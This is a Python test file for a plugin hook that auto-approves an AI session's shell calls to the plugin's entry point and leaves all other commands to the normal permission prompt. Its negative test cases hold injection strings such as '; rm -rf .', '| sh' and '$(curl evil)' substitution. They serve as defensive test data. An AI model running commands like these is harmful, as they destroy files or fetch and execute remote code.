"""
Tests for :mod:`basstler.plan_site.entry_point_approval`: allowing a session to run the
plugin's entry point without a prompt.
"""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

import basstler.plan_site.entry_point_approval
from basstler.github.repository_attachment import SessionTool
from basstler.locations import BasstlerVariable, PluginLocation
from basstler.maintenance.commands import FastForwardCommand, RestackCommand
from basstler.plan_site.attach_approval import AttachAnswer, PermissionDecision
from basstler.plan_site.entry_point_approval import (
    EntryPointInvocation,
    ShellArguments,
    ShellCall,
)

# %% the commands

INVOCATION = EntryPointInvocation
"""
The invocation the hook allows.
"""

ENTRY_POINT = f"${{{BasstlerVariable.PLUGIN_ROOT}}}/{PluginLocation.ENTRY_POINT_SCRIPT}"
"""
The entry point script as a skill writes it.
"""


def shell(command: str, tool: str = SessionTool.RUN_SHELL_COMMAND) -> ShellCall:
    """
    :param command: The command line the call runs.
    :param tool: The tool called.
    :return: The hook input for that call.
    """
    return ShellCall(tool, ShellArguments(command))


# %% allowing the entry point

MODULE_AND_ARGUMENTS = (
    f"{FastForwardCommand.invoked_as} --upstream-read {RestackCommand.invoked_as}"
)
"""
Arguments the entry point is run with, which the hook does not look at.
"""


@pytest.mark.parametrize(
    "command",
    [
        f'"{ENTRY_POINT}" maintenance {MODULE_AND_ARGUMENTS}',
        f"{ENTRY_POINT} maintenance {FastForwardCommand.invoked_as}",
        f'"/opt/plugin/{PluginLocation.ENTRY_POINT_SCRIPT}" maintenance '
        f"{FastForwardCommand.invoked_as}",
        f'"{ENTRY_POINT}" maintenance {RestackCommand.invoked_as}',
    ],
    ids=["with arguments", "bare variable", "expanded path", "another module"],
)
def test_the_entry_point_is_allowed(command: str):
    """
    The entry point is allowed however it names the plugin and whatever it runs.
    """
    answer = INVOCATION.permit(shell(command))

    assert answer.allowed.decision is PermissionDecision.ALLOW


def test_an_answer_reads_back_as_written():
    """
    What the hook prints parses back into the same answer.
    """
    answer = INVOCATION.permit(shell(f'"{ENTRY_POINT}" maintenance'))

    assert AttachAnswer.from_json(answer.to_json()) == answer


# %% leaving the decision alone


@pytest.mark.parametrize(
    "command",
    [
        f'"{ENTRY_POINT}" maintenance; rm -rf .',
        f'"{ENTRY_POINT}" maintenance && git push',
        f'"{ENTRY_POINT}" maintenance | sh',
        f'"{ENTRY_POINT}" maintenance > somewhere',
        f'"{ENTRY_POINT}" "$(curl evil)"',
        f'"$(curl evil)/{PluginLocation.ENTRY_POINT_SCRIPT}" maintenance',
        "git push maintenance",
    ],
    ids=[
        "chained with semicolon",
        "chained with and",
        "piped",
        "redirected",
        "substituted argument",
        "substituted path",
        "another program",
    ],
)
def test_any_other_command_is_left_to_the_normal_permission_flow(command: str):
    """
    Anything but the entry point alone gets no answer, so the user is asked as before.
    """
    assert INVOCATION.permit(shell(command)) is None


def test_another_tool_is_left_alone():
    """
    Only the shell tool is allowed, whatever its input says.
    """
    command = f'"{ENTRY_POINT}" maintenance'

    assert INVOCATION.permit(shell(command, tool=SessionTool.ASK_USER)) is None


# %% registering the hook

HOOK_EVENT = "PreToolUse"
"""
The event the hook is registered under in the plugin's hook manifest.
"""


def test_the_plugin_runs_the_hook_before_the_shell_tool():
    """
    The plugin's hook manifest registers this module for the shell tool.
    """
    plugin_root = Path(os.environ[BasstlerVariable.PLUGIN_ROOT])
    manifest = json.loads(
        (plugin_root / PluginLocation.HOOKS / "hooks.json").read_text()
    )

    (registration,) = [
        entry
        for entry in manifest["hooks"][HOOK_EVENT]
        if entry["matcher"] == SessionTool.RUN_SHELL_COMMAND
    ]
    (hook,) = registration["hooks"]
    assert hook["command"].endswith(
        f"{PluginLocation.ENTRY_POINT_SCRIPT} "
        f"{basstler.plan_site.entry_point_approval.__spec__.name.removeprefix('basstler.')}"
    )
